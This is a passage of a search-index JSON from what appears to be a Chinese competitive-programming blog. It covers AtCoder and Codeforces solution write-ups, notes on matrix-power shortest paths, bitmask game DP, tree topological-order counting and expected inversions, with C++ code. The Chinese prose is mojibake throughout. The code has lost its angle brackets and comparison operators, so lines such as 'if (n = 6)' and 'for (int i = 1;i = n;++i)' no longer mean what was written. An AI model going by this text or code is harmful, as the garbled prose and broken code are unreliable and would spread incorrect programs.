é€’é—­åŒ…çš„å…³ç³»å›¾ä¸Šå°±åº”æœ‰ä» $i$ åˆ° $j$ çš„è¾¹ï¼Œå‡ç”¨ $0/1$ è¡¨ç¤ºã€‚å› æ­¤æšä¸¾ä¸­è½¬ç‚¹ $k$ï¼Œè‹¥ $(i,k)$ ä¸ $(k,j)$ å‡æœ‰è¿è¾¹ï¼Œåˆ™å¯å°† $(i,j)$ è¿è¾¹ã€‚å†™æˆè¡¨è¾¾å¼ï¼Œå°±æ˜¯ï¼š f_{i,j} = \\max (f_{i,j},\\min (f_{i,k},f_{k,j}))ã€Q4ã€‘å˜å¼ $2$ [USACO07NOV] Cow Relays G æœ¬è´¨åŒ Walk è®¾ $A$ ä¸­æ˜¯ç»è¿‡ $x$ æ¡è¾¹çš„æœ€çŸ­è·¯ï¼Œ$B$ ä¸­æ˜¯ç»è¿‡ $y$ æ¡è¾¹çš„æœ€çŸ­è·¯ã€‚é€šè¿‡ä»¥ä¸‹è½¬ç§»åï¼Œå¯ä»¥å‘ç° $C$ ä¸­æ˜¯ç»è¿‡ $x + y$ æ¡è¾¹çš„æœ€çŸ­è·¯ï¼š C_{i,j} = \\min ({C_{i,j}},A_{i,k} + B_{k,j})è¿™æ ·æˆ‘ä»¬çš„è½¬ç§»å°±å˜å¾—ç®€å•ï¼Œé‡è½½åç›´æ¥é€šè¿‡çŸ©é˜µå¿«é€Ÿå¹‚å³å¯è§£å†³é—®é¢˜ã€‚ è¿›ä¸€æ­¥çš„å˜å¼ [SCOI2009] è¿·è·¯ï¼Œè¡¡é‡è·ç¦»ã€‚æ‹†ç‚¹ä¸ bitset çš„ä¼˜åŒ–ï¼Œæ—¶é—´å¤æ‚åº¦ $O(\\frac{n^3}{64} \\log k)$ã€‚å…·ä½“æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªç‚¹ï¼Œæ‹†æˆ $v_1 \\sim v_{10}$ï¼Œç„¶å $u \\to v$ ä¸€æ¡è¾¹ä¸º $w$ çš„è¾¹ï¼Œç„¶å $v_i \\to v_{i - 1}$ è¿›è¡Œè¿è¾¹ï¼Œäºæ˜¯å¯ä»¥å˜ä¸º $u \\to v_w$ã€‚","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼š[ABC387E] Digit Sum Divisible 2","path":"/2025/01/05/ABC387E/","content":"å¯ä»¥å°è¯•é€šè¿‡æ„é€ è§£å†³æ­¤é¢˜ã€‚ è€ƒè™‘åˆ°ä¸€ä¸ªæ•°èƒ½è¢« $9$ æ•´é™¤æ˜¯å„ä¸ªæ•°ä½ä¸Šå’Œä¸º $9$ çš„å€æ•°ï¼Œä¸€ä¸ªæ•°æ•´é™¤ $8$ åªéœ€è¦æœ«ä¸‰ä½å‡ä¸º $0$ å³å¯ã€‚å› æ­¤å¤§è‡´çš„æ–¹å‘å°±æ˜¯å»æ„é€  $x,8 - x,0,0,\\cdots,0,0,0$ çš„ä¸€ä¸ªæ•°æ¥æ»¡è¶³æ¡ä»¶ã€‚ã€ä¸ºä»€ä¹ˆé€‰æ‹© $8$ï¼šç›¸è¾ƒäº $4$ï¼Œ$8$ çš„æ‹†åˆ†æ¯”è¾ƒå¤šï¼Œå› æ­¤æ›´å®¹æ˜“æ»¡è¶³æ¡ä»¶ã€‚ã€‘ å†æ¥è€ƒè™‘ $[N,2N]$ è¿™ä¸ªèŒƒå›´çš„é™åˆ¶ã€‚è®¾ $N$ çš„æœ€é«˜ä½ $p$ï¼Œåˆ™ï¼š å½“ $p \\ge 7$ æ—¶ï¼Œæ„é€  $107\\underbrace{00\\cdots000}_{n-2}$ æ€»èƒ½ç¬¦åˆæ¡ä»¶ã€‚ å½“ $2 \\le p \\le 7$ ä»¥åŠ $17,18,19$ å¼€å¤´çš„æ•°ï¼Œæ„é€  $p + 1,7 - p,\\underbrace{0,0,\\cdots,0,0,0}_{n - 2}$ æ€»èƒ½ç¬¦åˆæ¡ä»¶ã€‚ $p=1$ çš„å…¶ä½™æƒ…å†µï¼Œæ„é€  $17\\underbrace{00\\cdots000}_{n-2}$ æ€»èƒ½ç¬¦åˆæ¡ä»¶ã€‚ å½“ç„¶ï¼Œ$N$ è¾ƒå°çš„æ—¶å€™éš¾ä»¥æ„é€ å‡ºä¸Šè¿°æ¡ä»¶ï¼Œç›´æ¥è·‘æš´åŠ›å³å¯ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n;char s[MAX]; int calc (int x) int res = 0; while (x) res += x % 10,x /= 10; return res;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s,s + 1);n = strlen (s + 1); if (n = 6) int num = 0; for (int i = 1;i = n;++i) num = num * 10 + s[i] - 0; for (int i = num;i 2 * num;++i) if (i % calc (i) == 0 (i + 1) % calc (i + 1) == 0) printf (%d ,i);return 0; puts (-1); return 0; if (s[1] = 7) printf (107); for (int i = 1;i = n - 2;++i) printf (0); puts (); else if (s[1] = 2 || (s[1] == 1 s[2] = 7)) int dig = s[1] - 0 + 1; printf (%d%d,dig,8 - dig); for (int i = 1;i = n - 2;++i) printf (0); puts (); else printf (17); for (int i = 1;i = n - 2;++i) printf (0); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF509C Sums of Digits","path":"/2024/12/31/CF2053F/","content":"å¯¹äºæ¯ä¸€è¡Œçš„ $-1$ï¼Œæ˜¾ç„¶åªä¼šå¡«ä¸€ç§æ•°å­—ï¼Œå› æ­¤å¯ä»¥å¾—å‡ºä¸€ç§æ¯”è¾ƒæœ´ç´ çš„ DPã€‚è®¾ $f_{i,j}$ è¡¨ç¤ºè€ƒè™‘å‰ $i$ è¡Œï¼Œç¬¬ $i$ è¡Œçš„ $-1$ å˜ä¸º $j$ æ—¶çš„æœ€å¤§å€¼ï¼Œå†è®¾ $d_{i,j}$ è¡¨ç¤ºç¬¬ $i$ è¡Œæ•°å­— $j$ çš„ä¸ªæ•°ï¼Œåˆ™å¯åˆ—å‡ºè½¬ç§»æ–¹ç¨‹ï¼š f_{i,j} = \\max \\limits _{o = 1} ^ k\\{f_{i - 1,o} + d_{i - 1,-1} \\times d_{i,o} + d_{i - 1,-1} \\times d_{i,-1}\\} + d_{i - 1,j} \\times d_{i,j} + d_{i - 1,j} \\times d_{i,-1}ç”±äº $d$ æ•°ç»„å¯ä»¥é¢„å¤„ç†è·å¾—ï¼Œäºæ˜¯å°±å¾—åˆ°äº† $O(nk)$ çš„ç®—æ³•ã€‚ è¿›ä¸€æ­¥è§‚å¯Ÿè¿™ä¸ªæ–¹ç¨‹ï¼Œå‘ç°æ–¹ç¨‹ä¸­ä¸ $j$ æ— å…³çš„é‡å¯ä»¥ç›´æ¥ç”¨çº¿æ®µæ ‘åŒºé—´åŠ å¤„ç†ï¼Œä¸ $j$ ç›¸å…³çš„ç›´æ¥å•ç‚¹åŠ ï¼ˆæ¯ä¸€è¡Œæœ€å¤šåªéœ€è¦ $O(m)$ æ¬¡ï¼‰ã€‚äºæ˜¯å¯ä»¥ç”¨æœ‰åŒºé—´åŠ ï¼Œå•ç‚¹åŠ ï¼Œå•ç‚¹å–æœ€å¤§å€¼ï¼Œæœ€åç»´æŠ¤åŒºé—´æœ€å¤§å€¼çš„æ•°æ®ç»“æ„å®ç°ã€‚è¿™é‡Œç”¨ä¸¤ä¸ªæ‡’æ ‡è®°çš„çº¿æ®µæ ‘å»å®ç°ï¼Œæ¯ä¸€æ¬¡æ ‡è®°ä¸‹ä¼ çš„æ—¶å€™ï¼ŒåŠ æ³•çš„æ‡’æ ‡è®°ç›´æ¥ç´¯åŠ ï¼Œè€Œæœ€å¤§å€¼çš„æ‡’æ ‡è®°éœ€è¦å…ˆä½œåŠ æ³•åå†å–æœ€å€¼ã€‚æœ€åæˆ‘ä»¬å°±èƒ½å¾—åˆ° $O(nm \\log (k))$ çš„ç®—æ³•ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 6e5 + 5;const int MOD = 1e9 + 7;inline int read ();map ll,ll mp[2];ll tree[MAX 2],tmp[MAX 2],mx[MAX 2];int t,n,m,k;void modify (int cur,int l,int r,int x,int y,pair ll,ll p);void pushdown (int cur);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();k = read ();mp[0].clear (); vector vector ll a (n + 5, vector ll (m + 5)); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) a[i][j] = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) ++mp[1][a[i][j]]; for (auto v : mp[1]) if (v.first != -1) modify (1,1,k,v.first,v.first,mp[0][-1] * v.second,0); int mx = tree[1]; modify (1,1,k,1,k,mp[0][-1] * mp[1][-1],0); modify (1,1,k,1,k,0,mx); for (auto v : mp[1]) if (v.first != -1) modify (1,1,k,1,k,mp[0][v.first] * mp[1][v.first],0); for (auto v : mp[0]) if (v.first != -1) modify (1,1,k,v.first,v.first,mp[1][-1] * v.second,0); mp[0].clear (); for (auto v : mp[1]) mp[0][v.first] = v.second; mp[1].clear (); printf (%lld ,tree[1]); for (int i = 0;i = 4 * k;++i) tree[i] = tmp[i] = mx[i] = 0; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void pushdown (int cur) // æ³¨æ„æ˜¯å…ˆä½œåŠ æ³•åå– max tree[cur 1] = max (tree[cur 1] + tmp[cur],mx[cur]); tree[cur 1 | 1] = max (tree[cur 1 | 1] + tmp[cur],mx[cur]); tmp[cur 1] += tmp[cur],tmp[cur 1 | 1] += tmp[cur]; mx[cur 1] = max (mx[cur 1] + tmp[cur],mx[cur]);mx[cur 1 | 1] = max (mx[cur 1 | 1] + tmp[cur],mx[cur]); tmp[cur] = mx[cur] = 0; void modify (int cur,int l,int r,int x,int y,pair ll,ll p) if (x = l y = r) tmp[cur] += p.first;mx[cur] = max (mx[cur] + p.first,p.second); tree[cur] = max (tree[cur] + p.first,p.second); return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify (cur 1,l,mid,x,y,p); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,p); tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);","categories":["Solution"]},{"title":"åšå¼ˆè®ºä¸çŠ¶å‹","path":"/2024/12/28/GameTheory/","content":"Weighted Tic-Tac-Toe ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºæ¯ä¸€æ ¼çš„æƒ…å†µï¼Œç„¶åå¿…èƒœæ€å’Œå¿…è´¥æ€éœ€è¦ç›¸äº’è½¬æ¢ã€‚ Remove Pairs ç›´æ¥çŠ¶å‹ï¼Œæ—¶é—´å¤æ‚åº¦ $O(2^nn^2)$ã€‚ Exchange Game $dp_{f,st}$ è¡¨ç¤ºæŸä¸€æ–¹å–ï¼ŒçŠ¶æ€ä¸º $st$ æ—¶çš„èµ¢å®¶ï¼Œç”±äºæ¶‰åŠä¸¤æ–¹ä¸ç‰Œå †ï¼Œæ‰€ä»¥ç”¨ä¸‰è¿›åˆ¶è¿›è¡ŒçŠ¶å‹ã€‚æ”¾ä¸ªæ ¸å¿ƒä»£ç ï¼š int get (int nw,int p) return nw / pw[p] % 3;int add (int nw,int p,int v) return nw + (v - get (nw,p)) * pw[p]; bool dfs (bool f,int st) if (dp[f][st] != -1) return dp[f][st];//dp[f][st] è¡¨ç¤º f å–ï¼ŒçŠ¶æ€ä¸º st æ—¶å“ªä¸€æ–¹èµ¢ for (int i = 0;i N;++i)//å‡ºç‰Œ if (get (st,i) != f) continue; for (int j = 0;j N;++j)//æ‹¿å› if (get (st,j) != 2 || a[j] = a[i]) continue; if (dfs (f ^ 1,add (add (st,i,2),j,f)) == f) return dp[f][st] = f; if (dfs (f ^ 1,add (st,i,2)) == f) return dp[f][st] = f;//ä¸æ‹¿ return dp[f][st] = f ^ 1;","categories":["Algorithm"]},{"title":"æ ‘çš„æ‹“æ‰‘åº","path":"/2024/12/27/Topo/","content":"å®šä¹‰ï¼šä¸€æ£µæœ‰æ ¹æ ‘å½¢æˆçš„ä»»ä¸€æ’åˆ— $p$ï¼Œè‹¥ $i$ æ˜¯ $j$ çš„çˆ¶äº²ï¼Œæ’åˆ— $p$ å‡æ»¡è¶³ $i$ åœ¨ $j$ ä¹‹å‰ã€‚æ›´åŠ å½¢å¼åŒ–çš„ï¼Œ$\\forall 1 \\le i j \\le n$ï¼Œ$p_j$ å‡ä¸æ˜¯ $p_i$ çš„çˆ¶äº²ã€‚ ç»“è®ºï¼šè®¾ $f_u$ è¡¨ç¤ºä»¥ $u$ ä¸ºæ ¹æ—¶è¯¥å­æ ‘çš„åˆæ³•æ‹“æ‰‘åºçš„æ•°é‡ï¼Œ$sz_u$ è¡¨ç¤ºå­æ ‘å¤§å°ï¼Œåˆ™æœ‰ $f_u = \\dfrac{sz_u!}{\\prod sz_v \\mid v \\in \\rm{subtree}(u)}$ã€‚ ä»¥ä¸‹æ˜¯è¯æ˜ï¼š é¦–å…ˆè€ƒè™‘äºŒå‰æ ‘çš„æƒ…å†µã€‚è‹¥ä»¥ $u$ ä¸ºæ ¹ï¼Œæ­¤æ—¶æ¯é¢—å­æ ‘å†…çš„ç›¸å¯¹é¡ºåºæ˜¯ç¡®å®šçš„ï¼Œåªéœ€è¦è€ƒè™‘å­æ ‘é—´çš„ç›¸å¯¹é¡ºåºã€‚æ•…æœ‰ï¼š f_u = f_{v_1} \\times f_{v_2} \\times \\binom {sz_{v_1} + sz_{v_2}}{sz_{v_1}}è‹¥æ˜¯ä¸‰å‰æ ‘ï¼Œè€ƒè™‘å°† $v_1$ ä¸ $v_2$ çš„ç›¸å¯¹é¡ºåºå…ˆå›ºå®šå½¢æˆä¸€ä¸ªæ•´ä½“åï¼Œå†è€ƒè™‘ $v_3$ï¼Œåˆ™å¯å¾—ï¼š f_u = f_{v_1} \\times f_{v_2} \\times f_{v_3} \\times \\binom {sz_{v_1} + sz_{v_2}}{sz_{v_1}} \\times \\binom {sz_{v_1} + sz_{v_2} + sz_{v_3}}{sz_{v_1} + sz_{v_2}} \\\\ = f_{v_1} \\times f_{v_2} \\times f_{v_3} \\times \\dfrac{\\left(sz_{v_1} + sz_{v_2} + sz_{v_3}\\right)!}{sz_{v_1}!sz_{v_2}!sz_{v_3}!}æ¨å¹¿åˆ°ä¸€èˆ¬ï¼Œåˆ™å¯æ¨å‡ºï¼š f_u = \\left(\\prod \\limits_{v \\in \\rm{son}(u)} f_v\\right)\\times \\dfrac{(sz_u - 1)!}{\\prod \\limits_{v \\in \\rm{son}(u)} (sz_v!)} \\\\ = (sz_u - 1)! \\prod \\limits_{v \\in \\rm{son}(u)} \\left(\\dfrac{f_v}{sz_v!}\\right)å†ç”± $(sz_u - 1)! = \\frac{sz_u!}{sz_u}$ åšè¿›ä¸€æ­¥çš„åŒ–ç®€ï¼š f_u = \\frac{sz_u!}{sz_u} \\prod \\limits_{v \\in \\rm{son}(u)} \\left(\\dfrac{\\dfrac{sz_v!}{sz_v}\\prod \\limits_{p \\in \\rm{son(v)}} \\dfrac{f_p}{sz_p}}{sz_v!}\\right)ç»§ç»­è¿­ä»£å¯å¾—ï¼š f_u = \\dfrac{sz_u!}{\\prod \\limits_{v \\in \\rm{subtree}(u)}sz_v} Distributing Integers è‹¥ä»¥ $1$ ä¸ºæ ¹ç­”æ¡ˆä¸º $f_1 = \\dfrac{n!}{\\prod \\limits _{i = 1}^n sz_i}$ã€‚è€Œç°åœ¨éœ€è¦æ±‚ä»¥ä»»æ„ä¸€ç‚¹ä¸ºæ ¹æ—¶çš„ç­”æ¡ˆï¼Œæ•…è€ƒè™‘æ¢æ ¹ dpã€‚å½“ç”± $f_u$ è½¬ç§»è‡³ $f_v$ æ—¶ï¼Œåªæœ‰ä¸¤ç‚¹çš„ $sz$ å‘ç”Ÿå˜åŒ–ï¼Œæ•…å¯å¾—åˆ°è½¬ç§»æ–¹ç¨‹ $f_v = f_u \\times \\frac{n - sz_v}{sz_v}$ã€‚ä¸¤æ¬¡ dfs å³å¯æ±‚å¾—æ‰€æœ‰çš„ $f_i$ï¼Œæš´åŠ›é€†å…ƒç»´æŠ¤ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ã€‚ Topology è®¾ $dp_{i,j}$ è¡¨ç¤ºèŠ‚ç‚¹ $i$ ä½äºç¬¬ $j$ ä¸ªä½ç½®çš„æ–¹æ¡ˆæ•°ã€‚è‹¥ $u$ æ˜¯ $v$ çš„çˆ¶äº²ï¼Œåˆ™å½“ $dp_{u,i}$ è½¬ç§»è‡³ $dp_{v,j}$ æ—¶ï¼Œç”±äº $u$ å†…å­˜åœ¨å…¶ä½™å­æ ‘ï¼Œä¸ºäº†æ–¹ä¾¿è½¬ç§»ï¼Œæ–¹ç¨‹ä¸­ $dp_{i,j}$ ä¸è€ƒè™‘å­æ ‘ $i$ å†…çš„é¡ºåºï¼Œåœ¨ç»Ÿè®¡ç­”æ¡ˆçš„æ—¶å€™å†ä½œæ›´æ–°ã€‚å½“ $dp_{u,i}$ è½¬ç§»è‡³ $dp_{v,j}$ æ—¶ï¼Œéœ€è¦è€ƒè™‘çš„å°±æ˜¯ $u$ çš„å…¶ä½™å­æ ‘åœ¨æ•´ä¸€æ‹“æ‰‘åºä¸­çš„ä½ç½®ï¼Œä»¥åŠ $u$ çš„å…¶ä½™å­æ ‘çš„ç›¸å¯¹æ‹“æ‰‘åºã€‚å‰è€…å°±æ˜¯ç”¨ç»„åˆæ•°æ±‚å‡ºåœ¨å‰©ä½™çš„ä½ç½®ä¸­æ‰¾ $sz_u - sz_v - 1$ ä¸ªå°† $u$ å†…ä¸å« $v$ å­æ ‘å†…çš„èŠ‚ç‚¹æ”¾å…¥çš„æ–¹æ¡ˆæ•°ï¼Œåè€…ç›´æ¥å¥—ç»“è®ºã€‚æ•…æœ‰ï¼š dp_{v,j} = \\sum \\limits_{i = 1}^{j - 1} dp_{u,i} \\times \\binom{n - i - sz_v}{sz_u - sz_v - 1} \\times \\dfrac{(sz_u - sz_v - 1)!}{\\prod \\limits_{w \\in \\rm{subtree}(u) \\land w otin \\rm{subtree}(v)} sz_w}æœ€åçš„ç­”æ¡ˆä¾¿æ˜¯ï¼š dp_{i,i} \\times \\binom{n - i}{sz_i - 1} \\times \\dfrac{sz_i!}{\\prod \\limits_{v \\in \\rm{subtree}(i) }sz_v}æ³¨æ„åˆ°è½¬ç§»æ–¹ç¨‹å¯ä»¥å‰ç¼€å’Œä¼˜åŒ–ï¼Œæ‰€ä»¥æœ€åçš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(n^2)$ã€‚åƒä¸‡éœ€è¦å…ˆé¢„å¤„ç†å‡ºé€†å…ƒï¼Œ$O(n^2 \\log n)$ çš„åšæ³•åœ¨ CF ä¸Šä¼šæŒ‚ã€‚æ”¾ä¸ªæ ¸å¿ƒä»£ç å§ï¼š void dfs1 (int u,int fa) sz[u] = prod[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; prod[u] = 1ll * prod[u] * prod[v] % MOD; prod[u] = 1ll * prod[u] * sz[u] % MOD;void dfs2 (int u,int fa) for (auto v : ve[u]) if (v == fa) continue; int tmp = qpow (1ll * prod[u] * inv_prod[v] % MOD * inv_sz[u] % MOD,MOD - 2); for (int j = 1;j = n;++j) ndp[j] = (1ll * dp[u][j] * calc (n - j - sz[v],sz[u] - sz[v] - 1) % MOD + ndp[j - 1]) % MOD; for (int j = 1;j = n;++j) dp[v][j] = 1ll * ndp[j - 1] * f[sz[u] - sz[v] - 1] % MOD * tmp % MOD; dfs2 (v,u);","categories":["Algorithm"]},{"title":"é€†åºå¯¹ä¸æœŸæœ›","path":"/2024/12/26/Inversion/","content":"æ¯é¢˜â€”é€†åºå¯¹ä¸æœŸæœ› æ±‚é•¿åº¦ä¸º $n$ çš„æ’åˆ—çš„æœŸæœ›çš„é€†åºå¯¹ä¸ªæ•°ã€‚ å¯¹äºæ¯ä¸€å¯¹æ•°ï¼Œæ˜¯å¦æˆä¸ºé€†åºå¯¹çš„æ¦‚ç‡æ˜¾ç„¶ä¸º $\\frac{1}{2}$ï¼Œé‚£ä¹ˆå°±æœ‰ï¼š E(x) = E(\\sum\\limits_{i,j\\mid i < j}[a_i > a_j])=\\sum\\limits_{i,j\\mid i < j}(E([a_i > a_j]) = \\sum\\limits_{i,j\\mid i < j} \\frac{1}{2} = \\frac{n(n-1)}{4} å˜å¼ $1$ Another Shuffle Window é¢˜æ„ï¼š æ¯æ¬¡å¯ä»¥é€‰æ‹©ä¸€ä¸ªé•¿åº¦ä¸º $k$ çš„è¿ç»­åŒºé—´è¿›è¡Œé‡æ’ï¼Œæ±‚æœŸæœ›çš„é€†åºå¯¹ä¸ªæ•°ã€‚ æ¯æ¬¡é€‰æ‹©ä¸€å¯¹ $(a_i,a_j)$ å»è€ƒè™‘æ˜¯å¦å¯ä»¥äº§ç”Ÿè´¡çŒ®ã€‚å¯¹äºä¸€ä¸ªé•¿åº¦å›ºå®šçš„åŒºé—´ï¼Œå¯ä»¥åˆ†åŒºé—´å†…å’ŒåŒºé—´å†…å¤–åˆ†åˆ«è€ƒè™‘ã€‚å¯¹äºåè€…ï¼Œæ— è®ºåŒºé—´å†…æ€ä¹ˆé‡æ’ï¼Œéƒ½å¯ä»¥ç›´æ¥è®¡ç®—å‡ºä¸åŒºé—´å¤–çš„é€†åºå¯¹æ•°ï¼Œåƒæ»‘åŠ¨çª—å£ä¸€æ ·ç›´æ¥å¤„ç†å³å¯ã€‚ å˜å¼ $2$ Inversions After Shuffle æ¯æ¬¡å¯ä»¥é€‰æ‹©ä»»æ„é•¿åº¦çš„è¿ç»­åŒºé—´è¿›è¡Œé‡æ’ï¼Œæ±‚æœŸæœ›çš„é€†åºå¯¹ä¸ªæ•°ã€‚ æ ¹æ®é€‰æ‹©çš„ $(a_i,a_j)$ æ˜¯å¦ä¼šäº§ç”Ÿè´¡çŒ®ä»è€Œåˆ—å‡ºå¼å­ï¼Œå¹¶ç”¨æ•°æ®ç»“æ„ç»´æŠ¤ã€‚æ˜¾ç„¶æ‰€æœ‰çš„åŒºé—´æ•°ä¸º $C_n^1 + C_n^2 = C_{n + 1}^2 = \\frac{n(n + 1)}{2}$ï¼Œåˆ™å¯¹äºè¿™ä¸€å¯¹æ•°ï¼ˆæ˜¾ç„¶æ­¤æ—¶ $i eq j$ï¼‰ï¼Œä»¤ $i j$ï¼Œæœ‰ $\\frac{2i(n - j + 1)}{n(n + 1)}$ çš„æ¦‚ç‡è¢«ä¸€ä¸ªåŒºé—´åŒ…å«ã€‚è€Œ $(a_i,a_j)$ åˆæœ‰ $\\frac{1}{2}$ çš„æ¦‚ç‡æˆä¸ºé€†åºå¯¹ã€‚ è‹¥ $a_i,a_j$ è¢«é€‰ä¸­ï¼Œåˆ™è´¡çŒ®çš„ç­”æ¡ˆä¸º \\sum \\limits_{i = 1} ^ n \\sum \\limits_{j = i + 1}^n \\frac{1}{2}\\frac{2i(n - j + 1)}{n(n + 1)}\\\\ =(1 \\frac{n(n - 1)}{2} + 2 \\frac{(n - 1)(n - 2)}{2} + \\cdots + n\\frac{1 \\times 0}{2}) \\times \\frac{1}{n(n + 1)}\\\\ = \\frac{1}{2n(n + 1)} \\sum \\limits_{i = 1}^n i(n - i + 1)(n - i)è‹¥ä¸è¢«é€‰ä¸­ï¼Œåˆ™åªæœ‰å½“ $a_i a_j$ æ—¶æ‰ä¼šäº§ç”Ÿè´¡çŒ®ï¼Œç­”æ¡ˆä¸º \\sum \\limits_{i = 1}^n \\sum \\limits_{j = i + 1}^n [1 - \\frac{2i(n - j + 1)}{n(n + 1)}] [a_i > a_j]\\\\ =\\sum \\limits_{i = 1}^n \\sum \\limits_{j = i + 1}^n [a_i > a_j] - \\frac{2}{n(n + 1)}\\sum \\limits_{i = 1}^n (i\\sum \\limits_{j = i + 1}^{n}(n - j + 1)[a_i > a_j])å¯¹äºå‰è€…ï¼Œç›´æ¥å¾ªç¯ç»´æŠ¤å³å¯ã€‚å¯¹äºåè€…ï¼Œç”¨æ ‘çŠ¶æ•°ç»„ç»´æŠ¤é€†åºå¯¹ã€‚ä½†éœ€è¦æ³¨æ„å¾ªç¯æšä¸¾åº”è¯¥ä»åå¾€å‰ï¼Œä»è€Œä¿è¯æ¯æ¬¡æŸ¥è¯¢æ—¶åœ¨å…¶ä¹‹åçš„æ•°çš„ç›¸å¯¹å¤§å°å·²å­˜å…¥æ ‘çŠ¶æ•°ç»„ä¸­ã€‚ for (int i = n;i;--i) sum += 1.0 * i * query (a[i]); modify (a[i],n - i + 1); å˜å¼ $3$ Inversion Expectation é¢˜æ„ï¼šé•¿åº¦ä¸º $n$ çš„æ’åˆ—ä¸­æœ‰ä¸€äº›æ•°æ˜¯ä¸ç¡®å®šçš„ï¼Œæ±‚è¯¥æ’åˆ—çš„é€†åºå¯¹ã€‚ åˆ†ç±»è®¨è®ºï¼Œå…±ä¸‰ç§æƒ…å†µï¼š ä¸¤ä¸ªå·²çŸ¥æ•°æ„æˆé€†åºå¯¹ æ ‘çŠ¶æ•°ç»„æ±‚è§£å³å¯ã€‚ ä¸¤ä¸ªæœªçŸ¥æ•°æ„æˆé€†åºå¯¹ ç”¨æ¯é¢˜çš„ç»“è®º $\\frac{n(n - 1)}{4}$ å³å¯ã€‚ ä¸€ä¸ªæœªçŸ¥æ•°ï¼Œä¸€ä¸ªå·²çŸ¥æ•° è®¾å·²çŸ¥æ•° $a$ å‰é¢çš„æœªçŸ¥æ•°ä¸ªæ•°ä¸º $k$ï¼Œæ¯” $a$ å¤§çš„æœªçŸ¥æ•°ä¸ªæ•°ä¸º $m$ï¼Œæ€»å…±çš„æœªçŸ¥æ•°ä¸ªæ•°ä¸º $n$ï¼Œåˆ™æ­¤æ—¶çš„è´¡çŒ®ä¸º $k \\times \\frac{m}{n}$ã€‚é‚£ä¹ˆåœ¨åé¢çš„æ¯” $a$ å°çš„æœªçŸ¥æ•°çš„è´¡çŒ®åŒç†ã€‚ Shohag Loves Inversions é¢˜æ„ï¼š åˆå§‹æ—¶ $a = [0,1]$ï¼Œæ¯æ¬¡æ›´æ–°å°† $a$ é€†åºå¯¹çš„æ•°é‡ $k$ æ’å…¥å…¶ä¸­ï¼Œæ±‚æœ€ç»ˆé•¿åº¦ä¸º $n$ çš„åºåˆ—çš„æ•°é‡ã€‚ ä»¥ä¸‹å‡è®¾å½“å‰çš„åºåˆ—é€†åºå¯¹çš„æ•°é‡ä¸º $k$ã€‚ é¦–å…ˆéœ€è¦é€šè¿‡è§‚å¯Ÿå¾—å‡ºä¸€ä¸ªæ€§è´¨ï¼Œå½“åºåˆ—ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ çš„æ—¶å€™ï¼Œè‹¥å°† $k$ æ’åœ¨ä¸­é—´çš„ä½ç½®ï¼Œä¼šä½¿å¾— $kâ€™ k$ï¼Œåœ¨æœ«å°¾æ’å…¥åˆ™ $kâ€™ = k$ã€‚è®¾ $f_i$ è¡¨ç¤ºé•¿åº¦ä¸º $i$ ä¸”å½“å‰ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ æ—¶ï¼Œå˜ä¸ºé•¿åº¦ä¸º $n$ çš„åºåˆ—çš„æ•°é‡ã€‚å‰©ä¸‹è¿˜æœ‰ $n - i$ æ¬¡æ“ä½œï¼Œå¯ä»¥å°† $k$ å‡æ’å…¥æœ«å°¾ï¼Œæˆ–è€…åœ¨æœ«å°¾æ’å…¥è‹¥å¹²ä¸ªä»¥åå†å°† $k$ æ’å…¥ä¸­é—´çš„ $i$ ä¸ªä½ç½®ä¹‹ä¸€ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹è½¬ç§»ï¼š f_i = i \\times \\sum \\limits_{j = 0}^{n - i - 1} f_{i + j + 1} + 1ç°åœ¨æˆ‘ä»¬è®¨è®ºæ•´ä¸€ä¸ªåºåˆ—å‡ä¸º $k \\le 1$ çš„æƒ…å†µã€‚æ˜¾ç„¶ $k = 0$ æ—¶å°±åªæœ‰ $\\underbrace{00 \\cdots 0}_{n - 1}1$ è¿™ä¸€ç§ã€‚è€Œ $k = 1$ æ—¶åº”ä¸º $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ï¼Œå…¶ä¸­ $x \\in [0,n - 3]$ï¼Œæ•…æœ‰ $n - 2$ ç§ã€‚æ‰€ä»¥è¯´ï¼Œ$k \\le 1$ æ—¶ï¼Œå…±æœ‰ $n - 1$ ç§ã€‚ æœ€åè€ƒè™‘ $k \\le 1$ è½¬ç§»è‡³ $k 1$ çš„æƒ…å†µï¼Œæ˜¾ç„¶åªæœ‰ $k = 1$ æ—¶æ‰æœ‰å¯èƒ½ã€‚å› æ­¤å¯¹äº $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ ç±»å‹çš„ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç¬¬ä¸€ä¸ª 